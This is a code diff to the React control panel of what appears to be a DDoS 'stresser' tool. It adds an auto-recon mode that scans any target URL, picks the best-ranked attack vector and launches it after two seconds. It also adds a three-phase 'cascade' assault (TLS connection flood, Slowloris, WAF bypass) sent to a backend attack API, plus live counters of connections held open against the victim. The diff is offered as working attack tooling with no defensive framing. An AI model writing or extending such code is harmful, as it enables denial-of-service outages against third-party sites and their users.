@@ -456,6 +456,16 @@ function Panel() {
   /* Time remaining in current attack */
   const [timeRemaining, setTimeRemaining] = useState(0);
 
+  /* Live active connection counter (slowloris / conn-flood / geass-override) */
+  const [activeConns, setActiveConns] = useState(0);
+
+  /* Cascade attack state */
+  const [isCascading, setIsCascading] = useState(false);
+  const [cascadePhase, setCascadePhase] = useState(0); // 1=conn-flood, 2=slowloris, 3=waf-bypass
+
+  /* Auto-recon state */
+  const [isAutoRecon, setIsAutoRecon] = useState(false);
+
   /* Refs */
   const terminalRef    = useRef<HTMLDivElement>(null);
   const startTimeRef   = useRef<number | null>(null);
@@ -653,9 +663,18 @@ function Panel() {
         const data: CheckResult = await res.json();
         if (cancelled) return;
 
-        // Track probe latency for sparkline
+        // Track probe latency for sparkline + log significant spikes
         if (data.responseTime > 0) {
-          setLatencyHistory(prev => [...prev.slice(-29), data.responseTime]);
+          setLatencyHistory(prev => {
+            const next = [...prev.slice(-29), data.responseTime];
+            if (next.length >= 4 && data.up) {
+              const baseline = next.slice(0, -1).reduce((a, b) => a + b, 0) / (next.length - 1);
+              const pct = Math.round(((data.responseTime - baseline) / baseline) * 100);
+              if (pct >= 300) addLog(`🔥 LATENCY CRITICAL: ${data.responseTime}ms (+${pct}%) — server on the edge!`, "error");
+              else if (pct >= 80) addLog(`⚠ Latency spike: ${data.responseTime}ms (+${pct}%) — server degrading...`, "warn");
+            }
+            return next;
+          });
         }
 
         const prev = targetStatusRef.current;
@@ -711,6 +730,25 @@ function Panel() {
     const iv = setInterval(() => { refetchAttack(); }, 600);
     return () => clearInterval(iv);
   }, [isRunning, currentAttackId, refetchAttack]);
+
+  /* Live active-connection polling — for slowloris / conn-flood / geass-override */
+  const CONN_TRACKING_METHODS = new Set(["slowloris","conn-flood","geass-override","rudy"]);
+  useEffect(() => {
+    if (!isRunning || currentAttackId === null || !CONN_TRACKING_METHODS.has(method)) {
+      setActiveConns(0); return;
+    }
+    const poll = async () => {
+      try {
+        const r = await fetch(`${BASE}/api/attacks/${currentAttackId}/live`);
+        const d = await r.json() as { conns: number; running: boolean };
+        setActiveConns(d.conns ?? 0);
+      } catch { /* ignore */ }
+    };
+    poll();
+    const iv = setInterval(poll, 800);
+    return () => { clearInterval(iv); setActiveConns(0); };
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [isRunning, currentAttackId, method]);
 
   /* Cluster: poll slave nodes and aggregate stats */
   useEffect(() => {
@@ -1024,6 +1062,121 @@ function Panel() {
     } catch { addLog("✕ Benchmark failed.", "error"); }
   }
 
+  /* ── Auto-Recon: analyze target then auto-configure and launch ── */
+  async function handleAutoRecon() {
+    const urlToAnalyze = target.trim();
+    if (!urlToAnalyze) { addLog("✕ Enter a target URL first for Auto-Recon.", "error"); return; }
+    if (isRunning || isCascading) { addLog("✕ Stop current attack before launching Auto-Recon.", "error"); return; }
+    setIsAutoRecon(true); setIsAnalyzing(true); setShowAnalyze(true); setAnalyzeResult(null);
+    addLog(`👁 AUTO-RECON: Intelligence scan on ${urlToAnalyze}...`, "info");
+    try {
+      const res = await fetch(`${BASE}/api/analyze`, {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ url: urlToAnalyze }),
+      });
+      const data: AnalyzeResult = await res.json();
+      setAnalyzeResult(data);
+      const best = data.recommendations[0];
+      if (best) {
+        setMethod(best.method);
+        setThreads(best.suggestedThreads);
+        setDuration(best.suggestedDuration);
+        addLog(`👁 AUTO-RECON complete: ${data.recommendations.length} vectors ranked`, "success");
+        if (data.serverLabel) addLog(`👁 Server: ${data.serverLabel}${data.isCDN ? ` — CDN: ${data.cdnProvider}` : ""}`, "info");
+        addLog(`✅ Best vector: ${best.name} [${best.tier}] — ${best.score}/100 — ${best.reason}`, "success");
+        addLog(`👁 Auto-configured: ${best.method.toUpperCase()} × ${best.suggestedThreads}T × ${best.suggestedDuration}s`, "info");
+        addLog(`👁 GEASS LAUNCHING IN 2 SECONDS...`, "warn");
+        if (soundRef.current) playTone("tick");
+        setTimeout(() => { if (!isRunningRef.current) handleLaunch(); }, 2000);
+      } else {
+        addLog("⚠ No recommendations found — check target accessibility.", "warn");
+      }
+    } catch { addLog("✕ Auto-recon failed — backend error.", "error"); }
+    setIsAnalyzing(false); setIsAutoRecon(false);
+  }
+
+  /* ── Cascade Attack: 3-phase sequential assault ── */
+  async function handleCascade() {
+    const tgt = target.trim();
+    if (!tgt) { addLog("✕ Enter a target first for Cascade Attack.", "error"); return; }
+    if (isRunning || isCascading) { addLog("✕ Stop current attack before launching Cascade.", "error"); return; }
+    setIsCascading(true);
+    const isHttpsTarget = /^https:/i.test(tgt);
+    const tgtPort = isHttpsTarget ? 443 : 80;
+    const phase1Dur = Math.max(20, Math.round(duration * 0.35));
+    const phase2Dur = Math.max(15, Math.round(duration * 0.35));
+    const phase3Dur = Math.max(10, duration - phase1Dur - phase2Dur);
+
+    addLog(`👁 CASCADE PROTOCOL initiated — 3-phase assault on ${tgt}`, "info");
+    addLog(`  Phase 1 (${phase1Dur}s): TLS Connection Flood — exhaust connection table`, "info");
+    addLog(`  Phase 2 (${phase2Dur}s): Slowloris — hold half-open connections`, "info");
+    addLog(`  Phase 3 (${phase3Dur}s): WAF Bypass — precision HTTP strike`, "info");
+
+    if (soundRef.current) playTone("start");
+    if ("vibrate" in navigator) navigator.vibrate([200, 100, 200]);
+
+    // Phase 1: Connection Flood — immediately
+    setCascadePhase(1);
+    addLog(`🔴 Phase 1 ACTIVE — TLS Conn Flood launching...`, "warn");
+    try {
+      const r1 = await fetch(`${BASE}/api/attacks`, {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ target: tgt, port: tgtPort, method: "conn-flood", duration: phase1Dur + phase2Dur + phase3Dur, threads }),
+      });
+      const a1 = await r1.json() as { id: number };
+      setCurrentAttackId(a1.id); setIsRunning(true); isRunningRef.current = true;
+      targetRef.current = tgt; startTimeRef.current = Date.now(); durationRef.current = duration;
+      currentPacketsRef.current = 0; lastPacketsRef.current = 0; peakPpsRef.current = 0;
+      addLog(`👁 Phase 1 online [ID #${a1.id}]`, "success");
+      saveFavorite(tgt);
+
+      // Phase 2: Slowloris — starts after phase1
+      setTimeout(async () => {
+        if (!isRunningRef.current) return;
+        setCascadePhase(2);
+        addLog(`🔴 Phase 2 ACTIVE — Slowloris holding connections...`, "warn");
+        try {
+          const r2 = await fetch(`${BASE}/api/attacks`, {
+            method: "POST", headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ target: tgt, port: tgtPort, method: "slowloris", duration: phase2Dur + phase3Dur, threads }),
+          });
+          const a2 = await r2.json() as { id: number };
+          addLog(`👁 Phase 2 online [ID #${a2.id}]`, "success");
+        } catch { addLog("✕ Phase 2 launch failed.", "error"); }
+
+        // Phase 3: WAF Bypass — starts after phase1+phase2
+        setTimeout(async () => {
+          if (!isRunningRef.current) return;
+          setCascadePhase(3);
+          addLog(`🔴 Phase 3 ACTIVE — WAF Bypass precision strike...`, "warn");
+          if (soundRef.current) playTone("start");
+          try {
+            const r3 = await fetch(`${BASE}/api/attacks`, {
+              method: "POST", headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ target: tgt, port: tgtPort, method: "waf-bypass", duration: phase3Dur, threads }),
+            });
+            const a3 = await r3.json() as { id: number };
+            addLog(`👁 Phase 3 online [ID #${a3.id}]`, "success");
+          } catch { addLog("✕ Phase 3 launch failed.", "error"); }
+
+          // Cleanup after all phases complete
+          setTimeout(() => {
+            setCascadePhase(0); setIsCascading(false);
+            setIsRunning(false); isRunningRef.current = false;
+            setProgress(0); setCurrentAttackId(null); setPps(0); setBps(0); setActiveConns(0);
+            addLog(`✅ CASCADE PROTOCOL COMPLETE — all 3 phases executed`, "success");
+            addToast("geass", "CASCADE COMPLETE", `3 phases on ${getDomainKey(tgt)}`);
+            refetchStats(); refetchHistory();
+          }, phase3Dur * 1000 + 2000);
+        }, phase2Dur * 1000);
+      }, phase1Dur * 1000);
+
+    } catch {
+      addLog("✕ Cascade Phase 1 launch failed.", "error");
+      setIsCascading(false); setCascadePhase(0);
+    }
+  }
+
   async function handleFindOrigin() {
     if (isFindingOrigin) return;
     const rawTarget = target.trim() || "";
@@ -1269,7 +1422,33 @@ function Panel() {
               >
                 {isFindingOrigin ? "⏳" : "🕵"}
               </button>
+              <button
+                className={`lb-btn-icon lb-btn-autorecon ${isAutoRecon || isAnalyzing ? "lb-btn-analyzing" : ""}`}
+                title="Auto-Recon: scan target, pick best method, auto-launch"
+                onClick={handleAutoRecon}
+                disabled={isAutoRecon || isAnalyzing || isRunning || isCascading || !target.trim()}
+              >
+                {isAutoRecon ? "⏳" : "🎯"}
+              </button>
+              <button
+                className={`lb-btn-icon lb-btn-cascade ${isCascading ? "lb-btn-cascade--active" : ""}`}
+                title={`Cascade: 3-phase assault — Conn Flood → Slowloris → WAF Bypass`}
+                onClick={handleCascade}
+                disabled={isRunning || isCascading || !target.trim()}
+              >
+                {isCascading ? `P${cascadePhase}` : "⚔"}
+              </button>
             </div>
+            {/* Cascade phase indicator */}
+            {isCascading && cascadePhase > 0 && (
+              <div className="lb-cascade-bar">
+                <span className={`lb-cascade-phase ${cascadePhase === 1 ? "lb-cascade-phase--active" : cascadePhase > 1 ? "lb-cascade-phase--done" : ""}`}>Conn Flood</span>
+                <span className="lb-cascade-arrow">→</span>
+                <span className={`lb-cascade-phase ${cascadePhase === 2 ? "lb-cascade-phase--active" : cascadePhase > 2 ? "lb-cascade-phase--done" : ""}`}>Slowloris</span>
+                <span className="lb-cascade-arrow">→</span>
+                <span className={`lb-cascade-phase ${cascadePhase === 3 ? "lb-cascade-phase--active" : ""}`}>WAF Bypass</span>
+              </div>
+            )}
 
             {/* ── Analyzer Panel ── */}
             {showAnalyze && (
@@ -1706,14 +1885,34 @@ function Panel() {
                 <div className="lb-stat-val">{fmtNum(pps)}</div>
                 <div className="lb-stat-sub">Peak {fmtNum(peakPps)}</div>
               </div>
-              <div className="lb-stat lb-stat--gold">
-                <div className="lb-stat-head">
-                  <span className="lb-stat-label">Bandwidth</span>
-                  <span className="lb-stat-live">OUT</span>
+              {/* Active connections — only for connection-based methods */}
+              {(new Set(["slowloris","conn-flood","geass-override","rudy"])).has(method) ? (
+                <div className="lb-stat lb-stat--conns">
+                  <div className="lb-stat-head">
+                    <span className="lb-stat-label">Open Conns</span>
+                    <span className="lb-stat-live" style={{ color: activeConns > 0 ? "#e74c3c" : "#555" }}>
+                      {activeConns > 0 ? "HOLDING" : "RAMP"}
+                    </span>
+                  </div>
+                  <div className="lb-stat-val" style={{ color: activeConns > 1000 ? "#e74c3c" : activeConns > 200 ? "#e67e22" : "#D4AF37" }}>
+                    {activeConns > 0 ? fmtNum(activeConns) : "…"}
+                  </div>
+                  <div className="lb-stat-sub">
+                    {method === "slowloris" ? `cap ${fmtNum(Math.min(threads * 80, 25000))}` :
+                     method === "conn-flood" ? `cap ${fmtNum(Math.min(threads * 100, 30000))}` :
+                     "conn-flood + slowloris"}
+                  </div>
                 </div>
-                <div className="lb-stat-val">{fmtBps(bps)}</div>
-                <div className="lb-stat-sub">Peak {fmtBps(peakBps)}</div>
-              </div>
+              ) : (
+                <div className="lb-stat lb-stat--gold">
+                  <div className="lb-stat-head">
+                    <span className="lb-stat-label">Bandwidth</span>
+                    <span className="lb-stat-live">OUT</span>
+                  </div>
+                  <div className="lb-stat-val">{fmtBps(bps)}</div>
+                  <div className="lb-stat-sub">Peak {fmtBps(peakBps)}</div>
+                </div>
+              )}
               <div className="lb-stat lb-stat--dim">
                 <div className="lb-stat-head">
                   <span className="lb-stat-label">Total {isUDP ? "Pkts" : "Reqs"}</span>
